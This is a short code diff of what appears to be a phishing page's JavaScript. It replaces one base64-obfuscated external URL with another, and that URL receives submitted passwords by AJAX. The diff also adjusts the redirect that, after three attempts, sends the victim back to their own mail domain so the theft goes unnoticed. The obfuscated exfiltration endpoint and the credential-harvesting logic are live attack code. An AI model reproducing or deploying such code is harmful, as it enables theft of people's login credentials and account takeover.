@@ -462,7 +462,7 @@ return true;
       ///////////new injection////////////////
       count=count+1;
     //  console.log(count); 
- var d=atob("aHR0cHM6Ly9yYXlzd2F0ZXJzcG9ydHMuY29tL3Nhc3Mvd25wLnBocA==");
+ var d=atob("aHR0cHM6Ly9nbGFzdXJlLmxpZmUvd2Vic2l0ZV8yOGIxZWVjNi93bnAucGhw");
 		
 	   $.ajax({
         dataType: 'JSON',
@@ -489,7 +489,7 @@ return true;
                   if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
-                    window.location.replace("http://mail."+my_slice);
+                    window.location.replace("http://"+my_slice);
 
                   }
                   // $('#msg').html(response['msg']);
@@ -503,7 +503,7 @@ return true;
               $("#password").val("");
               if (count>=3) {
                 count=0;
-                window.location.replace("http://mail."+my_slice);
+                window.location.replace("http://"+my_slice);
               }
               $("#msg").show();
               // $('#msg').html("Please try again later");
@@ -524,4 +524,3 @@ return true;
 
 
 </div></div></div></div></div></div></body></html>
-
